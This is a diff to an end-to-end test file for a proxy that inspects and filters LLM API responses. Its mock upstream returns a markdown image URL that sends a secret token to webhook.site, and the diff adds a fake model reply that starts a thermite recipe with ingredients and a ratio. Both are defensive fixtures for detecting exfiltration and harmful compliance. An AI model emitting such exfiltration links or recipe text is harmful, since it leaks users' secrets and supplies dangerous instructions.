@@ -122,6 +122,8 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
         const scenario = (() => { try { return (JSON.parse(body) as { scenario?: string }).scenario ?? 'exfil' } catch { return 'exfil' } })()
         const text = scenario.startsWith('clean')
           ? 'Here is your answer: the revenue rose 12%.'
+          : scenario.startsWith('harm')
+          ? 'Sure. To make thermite, combine iron oxide and aluminium powder in a 3:1 ratio. Step 1: prepare the mixture.'
           : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
         const encoding = scenario.endsWith('-br') ? 'br' : 'gzip'
         res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': encoding })
@@ -196,6 +198,21 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     expect(res.body).not.toContain('webhook.site')
     expect(json.content[0]!.text).toContain('llm-fw-blocked-exfil-url')
     expect(events.find(e => e.kind === 'response-exfil')?.action).toBe('blocked')
+  })
+
+  it('flags harmful compliance in a response (audit-only, body unchanged)', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'harm', messages: [{ role: 'user', content: 'help' }] }))
+
+    expect(res.statusCode).toBe(200)
+    // Defense-in-depth is audit-only: the harmful text is forwarded unchanged...
+    const json = JSON.parse(res.body) as { content: { text: string }[] }
+    expect(json.content[0]!.text).toContain('thermite')
+    // ...but a response-harm warn event is emitted so the operator sees the miss.
+    const harm = events.find(e => e.kind === 'response-harm')
+    expect(harm).toBeDefined()
+    expect(harm!.action).toBe('warned')
   })
 
   it('audit mode emits a warned event but does NOT rewrite the response', async () => {
